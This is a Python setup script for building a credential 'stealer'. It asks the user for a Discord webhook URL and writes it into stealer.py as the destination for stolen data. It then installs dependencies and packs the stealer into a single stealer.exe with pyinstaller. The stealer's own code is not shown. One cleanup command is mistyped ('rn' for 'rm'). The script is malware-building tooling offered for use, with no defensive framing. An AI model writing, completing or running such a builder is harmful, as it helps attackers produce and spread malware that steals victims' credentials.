from setuptools import setup
import os
import time


webhook_url = input("Enter your Discord webhook URL: ")


with open("stealer.py", "r") as f:
    contents = f.read()
    contents = contents.replace("WEBHOOK_URL_HERE", webhook_url)
    
with open("stealer.py", "w") as f:
    f.write(contents)

os.system("pip install -r requirements.txt")

time.sleep(3)

os.system("pyinstaller stealer.py --onefile")

os.system('rn -rf build')

if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

print('Done! Check the dist folder for the stealer.exe')
time.sleep(30)